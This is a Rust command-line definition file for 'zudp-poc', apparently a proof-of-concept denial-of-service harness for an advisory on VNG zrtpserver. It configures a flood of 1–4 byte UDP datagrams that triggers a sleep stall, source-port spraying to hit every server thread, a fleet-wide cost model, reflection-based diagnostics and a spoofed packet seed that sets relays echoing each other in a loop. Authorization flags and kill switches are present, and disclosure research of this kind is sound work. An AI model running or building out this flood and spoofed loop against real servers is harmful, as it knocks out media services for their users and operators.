//! CLI surface (advisory §13, spoof guide §5.3).

use clap::{Args, Parser, Subcommand, ValueEnum};
use std::net::SocketAddr;

#[derive(Parser, Debug)]
#[command(
    name = "zudp-poc",
    about = "ZUDP-2026-001 authorized DoS PoC harness (short-datagram sleep stall)",
    long_about = "Authorized defensive research PoC for VNG zrtpserver (ZUDP-2026-001).\n\
                  Run ONLY against hosts you own or have written authorization to test.\n\
                  See ZUDP-2026-001-sleep-dos.md.",
    version
)]
pub struct Cli {
    #[command(flatten)]
    pub guards: GlobalGuards,

    #[command(subcommand)]
    pub command: Command,
}

/// Global kill-switch / authorization flags applied to every sending action.
#[derive(Args, Debug, Clone)]
pub struct GlobalGuards {
    /// Confirm you own or have written authorization for the target (required to send).
    #[arg(long, global = true)]
    pub i_have_authorization: bool,

    /// Hard ceiling on packets/second across a run (kill switch).
    #[arg(long, global = true, default_value_t = 2_000_000)]
    pub max_pps: u64,

    /// Hard ceiling on run duration in seconds (kill switch).
    #[arg(long, global = true, default_value_t = 300)]
    pub max_secs: u64,
}

#[derive(Subcommand, Debug)]
pub enum Command {
    /// attacker-flood: emit 1–4 byte UDP datagrams to hit the vulnerable branch.
    Attack(AttackArgs),
    /// victim-probe: paced valid-length sender that measures RTT + loss.
    Probe(ProbeArgs),
    /// harness: ramp the flood, run the probe, emit a dose–response table.
    Harness(HarnessArgs),
    /// cost: print the §10 cost model from measured r_thread / r_deg.
    Cost(CostArgs),
    /// diag: reachability + vulnerable-branch check via the 3x reflection primitive.
    Diag(DiagArgs),
    /// loop-seed: spoofed echo-loop seed (Linux + CAP_NET_RAW, `spoof` feature only).
    LoopSeed(LoopSeedArgs),
}

#[derive(Args, Debug, Clone)]
pub struct DiagArgs {
    /// Target SERVER_IP:PORT.
    #[arg(long)]
    pub target: SocketAddr,

    /// Number of short probe packets to send.
    #[arg(long, default_value_t = 50)]
    pub count: u64,

    /// Short-packet payload length (MUST be in 1..=4 to hit the vulnerable branch).
    #[arg(long, default_value_t = 3)]
    pub payload_len: usize,

    /// Send rate for the probes (kept low so reflections are not self-congested).
    #[arg(long, default_value_t = 20)]
    pub pps: u64,

    /// How long to keep listening for reflections after the last send, ms.
    #[arg(long, default_value_t = 2000)]
    pub linger_ms: u64,
}

#[derive(ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub enum SprayMode {
    /// Fixed single source port -> lands on ONE reuseport bucket (per-thread threshold).
    Single,
    /// Rotate a pool of source ports -> spreads across ALL buckets (whole-server).
    Spray,
}

#[derive(Args, Debug, Clone)]
pub struct AttackArgs {
    /// Target SERVER_IP:PORT (media port, default 4200).
    #[arg(long)]
    pub target: SocketAddr,

    /// Target packets/second (aggregate across workers). 0 = as fast as possible.
    #[arg(long)]
    pub pps: u64,

    /// Duration to flood, in seconds.
    #[arg(long)]
    pub secs: u64,

    /// Payload length in bytes; MUST be in 1..=4 to hit the vulnerable branch.
    #[arg(long, default_value_t = 3)]
    pub payload_len: usize,

    /// Bucket-coverage mode.
    #[arg(long, value_enum, default_value_t = SprayMode::Spray)]
    pub mode: SprayMode,

    /// Number of distinct source ports in the spray pool (>= server IO threads).
    #[arg(long, default_value_t = 256)]
    pub port_pool: usize,

    /// Fixed source port for `single` mode (0 = OS-chosen ephemeral).
    #[arg(long, default_value_t = 0)]
    pub src_port: u16,

    /// Sender worker threads. 0 = number of logical CPUs.
    #[arg(long, default_value_t = 0)]
    pub workers: usize,
}

#[derive(Args, Debug, Clone)]
pub struct ProbeArgs {
    /// Target SERVER_IP:PORT.
    #[arg(long)]
    pub target: SocketAddr,

    /// Probe send rate (pps). Default mimics 20 ms RTP ptime.
    #[arg(long, default_value_t = 50)]
    pub pps: u64,

    /// Valid media-frame payload length (MUST be > 4).
    #[arg(long, default_value_t = 172)]
    pub payload_len: usize,

    /// Measurement window in seconds.
    #[arg(long, default_value_t = 30)]
    pub secs: u64,

    /// Local bind address for the probe socket.
    #[arg(long, default_value = "0.0.0.0:0")]
    pub bind: SocketAddr,
}

#[derive(Args, Debug, Clone)]
pub struct HarnessArgs {
    /// Target SERVER_IP:PORT.
    #[arg(long)]
    pub target: SocketAddr,

    /// Comma-separated attacker pps ramp steps (0 = baseline).
    #[arg(long, default_value = "0,25,50,100,200,400,800")]
    pub steps: String,

    /// Dwell per step, seconds.
    #[arg(long, default_value_t = 30)]
    pub dwell_secs: u64,

    /// Probe send rate during measurement.
    #[arg(long, default_value_t = 50)]
    pub probe_pps: u64,

    /// Probe payload length (> 4).
    #[arg(long, default_value_t = 172)]
    pub probe_payload_len: usize,

    /// Attacker payload length (1..=4).
    #[arg(long, default_value_t = 3)]
    pub attack_payload_len: usize,

    /// Bucket-coverage mode for the flood.
    #[arg(long, value_enum, default_value_t = SprayMode::Spray)]
    pub mode: SprayMode,

    /// Post-ramp recovery window (probe-only) to measure backlog drain, seconds.
    #[arg(long, default_value_t = 30)]
    pub recovery_secs: u64,

    /// Write the results table here as JSON (in addition to CSV on stdout).
    #[arg(long)]
    pub out: Option<String>,
}

#[derive(Args, Debug, Clone)]
pub struct CostArgs {
    /// Measured pps to fully stall one thread (r_thread). Default = 1/3ms.
    #[arg(long, default_value_t = 333.0)]
    pub r_thread: f64,

    /// Measured pps for first perceptible degradation of one thread (r_deg).
    #[arg(long, default_value_t = 100.0)]
    pub r_deg: f64,

    /// IO threads per server (~ cores).
    #[arg(long, default_value_t = 40)]
    pub cores: u64,

    /// Number of servers in the fleet.
    #[arg(long, default_value_t = 80)]
    pub servers: u64,

    /// Wire size of a trigger packet in bytes (payload 3 + UDP 8 + IPv4 20 + Eth 14).
    #[arg(long, default_value_t = 45)]
    pub wire_bytes: u64,
}

#[derive(Args, Debug, Clone)]
pub struct LoopSeedArgs {
    /// Loop preset.
    #[arg(long, value_enum, default_value_t = LoopMode::SelfLoop)]
    pub mode: LoopMode,

    /// Relay A IPv4 address.
    #[arg(long)]
    pub a: String,

    /// Relay B IPv4 address (required for a-b mode).
    #[arg(long)]
    pub b: Option<String>,

    /// Media port bound on the relay(s).
    #[arg(long, default_value_t = 4200)]
    pub port: u16,

    /// Number of seed packets to emit, then stop (keep small).
    #[arg(long, default_value_t = 1)]
    pub seeds: u32,

    /// Seed payload length (1..=4).
    #[arg(long, default_value_t = 3)]
    pub payload_len: usize,
}

#[derive(ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub enum LoopMode {
    /// Seed src=B:port -> dst=A:port so two relays echo each other.
    #[value(name = "a-b")]
    AB,
    /// Seed src=A:port -> dst=A:port so one relay loops on itself.
    #[value(name = "self")]
    SelfLoop,
}
